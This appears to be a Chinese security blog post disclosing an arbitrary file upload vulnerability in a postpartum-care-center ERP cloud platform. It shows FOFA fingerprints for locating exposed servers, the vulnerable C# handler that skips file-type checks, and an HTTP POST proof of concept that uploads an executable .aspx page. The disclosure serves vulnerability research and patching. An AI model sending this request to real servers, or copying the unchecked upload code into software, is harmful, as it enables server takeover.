---
title: "月子会所ERP管理云平台 Page/ContractManager/ashx/Handler.ashx 任意文件上传漏洞"
source: https://mrxn.net/jswz/mamabaohe-ContractManager-rce.html
asset_dir: assets/月子会所erp管理云平台-pagecontractmanagerashxhandler.ashx-任意文件上传漏洞
---

# 月子会所ERP管理云平台 Page/ContractManager/ashx/Handler.ashx 任意文件上传漏洞

[Mrxn](https://mrxn.net/author/1)* 发表于2025/3/2 08:29
* 571浏览
* [0评论](#comment)
* 32分钟阅读

深入探索

MapPath

云计算

ERP


(adsbygoogle = window.adsbygoogle || []).push({});

---

# 漏洞简介

月子会所ERP管理云平台是由武汉金同方科技有限公司研发团队结合行业月子中心相关企业需求开发的一套综合性管理软件。月子会所ERP管理云平台的 Page/ContractManager/ashx/Handler.ashx 接口存在任意[文件上传](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0)漏洞，由于未对上传文件进行任何过滤，攻击者可利用该漏洞上传恶意文件，进而获取服务器控制权。

企业资源规划

# fofa语法

> body="月子护理ERP管理平台" || body="妈妈宝盒客户端.rar" || body="Page/Login/Login3.aspx" || app="妈妈宝盒-ERP"

# 漏洞分析

深入探索

云平台

Server

企业资源计划

```
public class Handler : IHttpHandler
{

    public void ProcessRequest(HttpContext context)
    {
        context.Response.ContentType = "text/plain";
        HttpFileCollection flist = context.Request.Files;
        string UploadfileURLList = "";
        if (context.Request.Files.Count > 0)
        {
            for (int i = 0; i < context.Request.Files.Count; i++)
            {
                HttpPostedFile mypost = flist[i];
                //if (mypost.ContentLength > 0)
                //{

                string picneme = mypost.FileName;
                string tuozhanming = picneme.Substring(picneme.LastIndexOf(".")).ToLower();     //拓展名
                string oldName = picneme.Substring(0, picneme.LastIndexOf("."));
                //if (tuozhanming == ".xlsx" || tuozhanming == ".docx" || tuozhanming == ".doc" || tuozhanming == ".xls")
                //{
                string newname = GetNewName(oldName, tuozhanming);
                UploadfileURLList += newname + "|";
                string url = System.Configuration.ConfigurationManager.AppSettings["UPLOAD_CONTACT_URL"].ToString();
                var uploadFileName = HttpContext.Current.Server.MapPath(url);
                if (!Directory.Exists(uploadFileName))
                {
                    Directory.CreateDirectory(uploadFileName);
                }

                //../../UploadBaseFolder/Contact/
                mypost.SaveAs(context.Server.MapPath("../" + url + newname));
                //mypost.SaveAs(context.Server.MapPath("../../../UploadfileURL/" + newname));
                System.Threading.Thread.Sleep(100);
                //}
                //}

            }
            UploadfileURLList = UploadfileURLList.Substring(0, UploadfileURLList.Length - 1);
        }
        context.Response.Write(UploadfileURLList);

    }

    public string GetNewName(string oldName, string tuozhanming)
    {
        string time = DateTime.Now.ToString("yyMMddHHmmss");
        //string newname = time.Replace("-", "").Replace(" ", "").Replace(":", "").Replace("年", "").Replace("月", "").Replace("日", "").Replace("/", "");
        return oldName + "_" + time + new Random().Next(0000000, 9999999) + tuozhanming;

    }
```

深入探索

编程语言教程

技术文章订阅

编码转换工具

直接上传对文件类型无任何过滤或校验，造成任意文件上传[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)。

UPLOAD\_CONTACT\_URL 位置在 web.config 设置，一般为

云存储

```
<add key="UPLOAD_CONTACT_URL" value="../../UploadBaseFolder/Contact/" />
```

所以最终上传文件保存路径为 /UploadBaseFolder/Contact/文件名

# 漏洞复现

## POC

```
POST /Page/ContractManager/ashx/Handler.ashx HTTP/1.1
Host: mamabaohe.mrxn.net
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary123

------WebKitFormBoundary123
Content-Disposition: form-data; name="file"; filename="test.aspx"

<%@Page Language="C#"%><%Response.Write(Guid.NewGuid().ToString("N"));System.IO.File.Delete(Server.MapPath(Request.Url.AbsolutePath));%>
------WebKitFormBoundary123--
```

访问上传文件 UploadBaseFolder/Contact/响应文件名

漏洞预警服务

[![月子会所ERP管理云平台 Page/ContractManager/ashx/Handler.ashx 任意文件上传漏洞](images/img-001-27f15b594bab.webp)](https://image.mrxn.net/c9ef0f2991d54c659999c0043989093a.webp)

成功打印随机GUID字符串并删除自身。

* 标签：
* [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
* [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
* [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
* [#rce](https://mrxn.net/tag/rce)
* [#文件上传](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0)
* [#asp.net](https://mrxn.net/tag/asp.net)

---


// 获取当前脚本所在的父容器
const parentContainer = document.currentScript.parentElement;
let searchContainer = parentContainer.querySelector('article') || parentContainer;
if (searchContainer) {
// 优先在 class 名为 prose 或 markdown 的容器内搜索 img 图片
let images = [];
const containers = searchContainer.querySelectorAll('.prose, .markdown');
containers.forEach(function(container) {
images = images.concat(Array.from(container.querySelectorAll('img')));
});
if (images.length === 0) {
images = searchContainer.querySelectorAll('img');
}
images.forEach(function(img) {
if (img.getAttribute('data-action') === 'zoom') {
const parentLink = img.parentNode;
if (parentLink.tagName === 'A') {
parentLink.setAttribute('data-fancybox', 'gallery');
}
} else {
const link = document.createElement('a');
link.setAttribute('data-fancybox', 'gallery');
link.setAttribute('href', img.getAttribute('src'));
img.parentNode.insertBefore(link, img);
link.appendChild(img);
}
});
// 初始化 Fancybox
Fancybox.bind("[data-fancybox]", {
// 您的自定义选项
});
}

文章目录
×

* [1.漏洞简介](#toc-1-)
* [2.fofa语法](#toc-2-)
* [3.漏洞分析](#toc-3-)
* [4.漏洞复现](#toc-4-)
* [4.1.POC](#toc-4-1-)



.x\_nav\_toc {
position: fixed;
top: 0;
right: -300px;
width: 280px;
height: 100%;
background-color: white;
box-shadow: -2px 0 15px rgba(0, 0, 0, 0.1);
z-index: 1000;
transition: right 0.3s ease;
display: flex;
flex-direction: column;
overflow: hidden;
padding-top: 10px;
}
.x\_nav\_toc.active {
right: 0;
}
.x\_toc\_header {
display: flex;
justify-content: space-between;
align-items: center;
padding: 15px 20px;
height: 48px;
border-bottom: 1px solid #eee;
}
.x\_toc\_title {
font-size: 18px;
font-weight: bold;
color: #333;
}
.x\_toc\_close {
background: none;
border: none;
font-size: 24px;
cursor: pointer;
color: #777;
transition: color 0.2s;
}
.x\_toc\_close:hover {
color: #333;
}
.x\_toc\_content {
flex: 1;
overflow-y: auto;
padding: 15px 20px;
padding-right: 10px;
}
.x\_anchor-list {
list-style-type: none;
padding: 0;
margin: 0;
}
/\* 减小目录项间距 \*/
.x\_anchor-list li {
margin-bottom: 4px; /\* 间距从8px减小到4px \*/
}
.x\_anchor-list a {
text-decoration: none;
color: #555;
display: block;
padding: 6px 10px; /\* 减少内边距 \*/
transition: all 0.2s;
font-size: 14px;
border-radius: 4px;
line-height: 1.4; /\* 减小行高 \*/
}
.x\_anchor-list a:hover,
.x\_anchor-list a:focus {
background-color: #f8f9fa;
color: #0068d6;
}
.toc-number {
font-weight: 600;
margin-right: 8px;
color: #495057;
display: inline-block;
min-width: 25px;
}
/\* 减小各级标题间距 \*/
.toc-h1 {
font-weight: 600;
font-size: 15px;
margin-top: 10px; /\* 上边距从15px减小到10px \*/
padding-left: 5px !important;
}
.toc-h2 {
font-size: 14px;
padding-left: 15px !important; /\* 缩进从20px减小到15px \*/
}
.toc-h3 {
font-size: 13px;
padding-left: 25px !important; /\* 缩进从30px减小到25px \*/
}
.toc-h4 {
font-size: 12px;
padding-left: 35px !important; /\* 缩进从40px减小到35px \*/
}
/\* 修改后的切换按钮样式 - 使用图标且位置下移 \*/
.x\_toc\_toggle {
position: fixed;
bottom:120px; right: 17px;width:40px;height:40px;background-color:white;
border-radius: 50%;
border: none;
cursor: pointer;
box-shadow: 0 4px 12px rgba(0,0,0,0.15);
z-index: 999;
transition: all 0.3s ease;
display: flex;
align-items: center;
justify-content: center;
padding: 0;
}
.x\_toc\_toggle svg {
width:24px;height:24px;stroke:#3d9bff;
}
.x\_toc\_toggle:hover {
#background-color: #0081f8;
transform: translateY(-3px);
box-shadow: 0 6px 15px rgba(0,0,0,0.2);
}
@media (max-width: 768px) {
.x\_nav\_toc {
width: 280px;
}
.x\_toc\_toggle {
bottom: 100px; /\* 手机端也下移位置 \*/
right: 30px;
width: 40px;
height: 40px;
}
.x\_toc\_toggle svg {
width: 20px;
height: 20px;
}
}

document.addEventListener('DOMContentLoaded', function() {
// 获取所有标题元素
var className = ".line-numbers";
var selectors = [];
for (var i = 1; i <= 6; i++) {
selectors.push(className + ' h' + i);
}
var headings = document.querySelectorAll(selectors.join(', '));
// 获取DOM元素
var tocContainer = document.querySelector('.x\_nav\_toc');
var toggleButton = document.querySelector('.x\_toc\_toggle');
var tocList = document.querySelector('.x\_anchor-list');
var closeButton = document.querySelector('.x\_toc\_close');
var currentHighlight = null;
// 检测是否为移动设备
const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
// 如果没有标题，隐藏所有元素
if (headings.length === 0) {
tocContainer.style.display = 'none';
toggleButton.style.display = 'none';
return;
}
// 初始化层级计数器
var counters = [0, 0, 0, 0, 0, 0]; // h1-h6
var currentLevel = 0;
// 生成带数字编号的目录
headings.forEach(function(heading, index) {
var level = parseInt(heading.tagName[1]);
// 更新计数器
counters[level - 1] += 1; // 增加当前级别计数器
// 重置更低级计数器
for (var i = level; i < 6; i++) {
counters[i] = 0;
}
// 生成编号字符串（如"1.2.3"）
var numberParts = [];
for (var i = 0; i < level; i++) {
if (counters[i] > 0) {
numberParts.push(counters[i]);
}
}
var numberText = numberParts.join('.')+'.';
// 创建唯一ID
var id = 'toc-' + numberText.replace(/\./g, '-');
heading.id = id;
var listItem = document.createElement('li');
var anchor = document.createElement('a');
var numberSpan = document.createElement('span');
numberSpan.className = 'toc-number';
numberSpan.textContent = numberText;
anchor.appendChild(numberSpan);
anchor.innerHTML += heading.textContent;
anchor.href = '#' + id;
anchor.classList.add('toc-h' + level);
listItem.appendChild(anchor);
tocList.appendChild(listItem);
// 添加点击事件（不关闭目录）
anchor.addEventListener('click', function(e) {
e.preventDefault();
// 更新高亮状态
if (currentHighlight) {
currentHighlight.classList.remove('active');
}
this.classList.add('active');
currentHighlight = this;
// 滚动到对应位置
var targetId = this.getAttribute('href').substring(1);
var targetElement = document.getElementById(targetId);
if (targetElement) {
var header = document.querySelector("header");
var headerHeight = header ? header.offsetHeight : 0;
var elementPosition = targetElement.getBoundingClientRect().top + window.pageYOffset;
var offsetPosition = elementPosition - headerHeight - 20;
window.scrollTo({
top: offsetPosition,
behavior: 'smooth'
});
// 滚动到目录项的可视区域
this.scrollIntoView({behavior: 'smooth', block: 'nearest'});
// 点击事件中
if (isMobile) {
closeToc(); // 移动端点击后关闭目录
}
}
});
});
// 切换按钮点击事件
toggleButton.addEventListener('click', function() {
tocContainer.classList.add('active');
});
// 关闭按钮点击事件
closeButton.addEventListener('click', function(e) {
e.stopPropagation();
closeToc();
});
// 滚动时更新高亮状态
window.addEventListener('scroll', function() {
var fromTop = window.scrollY;
var header = document.querySelector("header");
var headerHeight = header ? header.getBoundingClientRect().height : 0; // 更精确的header高度
//console.log(headerHeight);
// 精准计算标题文档位置
var activeSection = null;
headings.forEach(function(heading) {
var section = document.getElementById(heading.id);
if (!section) return;
// 使用getBoundingClientRect获取精确位置
var rect = section.getBoundingClientRect();
var sectionTop = rect.top + fromTop; // 转换为文档顶部绝对位置
var sectionBottom = rect.bottom + fromTop + headerHeight;
// 增加20px激活区域缓冲
if (fromTop + headerHeight + 20 >= sectionTop && fromTop < sectionBottom) {
activeSection = heading;
}
});
// 更新高亮状态（新增精确边界判断）
if (activeSection) {
var tocLink = tocList.querySelector('a[href="#' + activeSection.id + '"]');
if (tocLink && currentHighlight !== tocLink) {
if (currentHighlight) {
currentHighlight.blur();
currentHighlight.classList.remove('active');
}
tocLink.classList.add('active');
tocLink.focus();
currentHighlight = tocLink;
// 平滑滚动到可视区域（改进触发条件）
var tocRect = tocLink.getBoundingClientRect();
var tocContainerRect = tocContainer.getBoundingClientRect();
if (tocRect.bottom > tocContainerRect.bottom || tocRect.top < tocContainerRect.top) {
tocLink.scrollIntoView({behavior: 'auto', block: 'nearest'});
}
}
}
});
// 关闭目录面板
function closeToc() {
tocContainer.classList.remove('active');
}
});

/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
#qrcode-right {
display: none;
}
}

版权所有：[Mrxn's Blog](https://mrxn.net/)  
文章标题：[月子会所ERP管理云平台 Page/ContractManager/ashx/Handler.ashx 任意文件上传漏洞](https://mrxn.net/jswz/mamabaohe-ContractManager-rce.html)  
文章链接：<https://mrxn.net/jswz/mamabaohe-ContractManager-rce.html>  
本站文章均为原创，未经授权请勿用于任何商业用途。仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。

![](data:image/png;base64,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)

设备上扫码阅读


var qrcode = new QRCode(document.getElementById("copyright-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/mamabaohe-ContractManager-rce.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});

  

### 📚 推荐阅读

* [深信服运维安全管理系统 install\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-install_patch-rce.html)
* [深信服运维安全管理系统 del\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-del_patch-rce.html)
* [深信服运维安全管理系统 upload\_file 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-cssp-app-upload_file-rce.html)
* [深信服运维安全管理系统 csspost/update 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-csspost-update-rce.html)
* [深信服运维安全管理系统 save\_SNMP 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-SNMP-save_SNMP-rce.html)
* [深信服运维安全管理系统 getLdap 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-getLdap-rce.html)
* [深信服运维安全管理系统 Jwt 密钥硬编码](https://mrxn.net/jswz/sangfor_osm-login-search_login-token-leak.html)
* [深信服运维安全管理系统 del\_route 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_route-rce.html)
* [深信服运维安全管理系统 del\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_net-rce.html)
* [深信服运维安全管理系统 change\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-change_net-rce.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 updateLoginName SQL注入漏洞](https://mrxn.net/jswz/bigant-user-updateLoginName-sqli.html)
* [九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞](https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html)
* [九佳易管理系统 Ajax\_XT.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html)
* [青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://mrxn.net/jswz/qinglong-auth-bypass-rce.html)
* [九佳易管理系统 picHY.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](https://mrxn.net/jswz/bigant-install-config-rce.html)
* [东胜物流软件 MsChDuiController 多个SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsChDuiController-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](https://mrxn.net/jswz/bigant-Public-download.html)
* [东胜物流软件 MsAnnounceController SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsAnnounce-GetData-sqli.html)

  

/\* 底部展示样式 \*/
.qrcode-bottom-box {
margin: 40px auto;
text-align: center;
}
.qrcode-title {
font-size: 16px;
color: #666;
margin-bottom: 0px;
font-weight: bold;
text-align: center;
}
.qrcode-bottom-box img {
display: inline-block;
padding: 10px;
background: #fff;
border-radius: 8px;
margin: 10px auto;
}
/\* 悬浮展示样式 \*/
.qrcode-float {
position: fixed;
z-index: 9999;
background: rgba(255,255,255,0.98);
padding: 20px;
border-radius: 12px;
}
.qrcode-float:hover {
transform: scale(1.05);
}
/\* 移动端适配 \*/
@media (max-width: 1440px) {
.qrcode-float {
right: 2%;
transform: none;
}
}
/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
.qrcode-float {
display: none;
}
}

![](data:image/png;base64,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